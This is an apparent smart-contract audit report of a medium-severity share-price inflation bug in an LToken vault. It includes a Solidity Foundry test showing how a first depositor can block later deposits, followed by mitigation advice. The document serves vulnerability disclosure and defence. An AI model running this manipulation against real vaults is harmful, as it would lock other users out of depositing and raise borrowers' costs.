JohnSmith
# First user can set arbitrary price, which may prevent some users to deposit

## [M] First user can set arbitrary price, which may prevent some users to deposit
### Problem
First user can set share price by sending tokens to the system externally, price can be very high. As result a lot of users will not be able to deposit.
And borrowers will have smaller amount to borrow and higher interest rate to pay, because amount of underlying asset is smaller, because less amount of people are able to deposit.

### Proof of Concept
```solidity
pragma solidity 0.8.15;

import {TestBase} from "../utils/TestBase.sol";
import "forge-std/console.sol";

contract ProtocolTest is TestBase {
    address public alice = cheats.addr(1);
    address public bob = cheats.addr(2);

    function setUp() public {
        setupContracts();
    }

    function testSharePriceManipulation() public{
        erc20.mint(address(alice), 1000 ether);
        erc20.mint(address(bob), 1000 ether);
        cheats.prank(alice);
        erc20.approve(address(lErc20), type(uint256).max);
        cheats.prank(bob);
        erc20.approve(address(lErc20), type(uint256).max);

        cheats.startPrank(alice);
        lErc20.deposit(1, alice); // 1 share costs 1 wei now
        assertEq(lErc20.previewRedeem(1), 1);

        erc20.transfer(address(lErc20), 100 ether); // 1 share costs 100 ether + 1 wei now
        cheats.stopPrank();

        assertEq(lErc20.previewDeposit(80 ether), 0);
        assertEq(lErc20.previewDeposit(100 ether + 1), 1);

        //bob cannot deposit below share price which can be very expensive
        cheats.expectRevert("ZERO_SHARES");
        cheats.prank(bob);
        lErc20.deposit(80 ether, bob);
    }
```

### Mitigation
Force users to deposit at least some amount in the LToken vault .
That way the amount the attacker will need to ERC20.transfer to the system will be at least X * 1e18 instead of X which is unrealistic.
An alternative is to require only the first depositor to freeze big enough initial amount of liquidity. This approach has been used long enough by various projects, for example in Uniswap V2

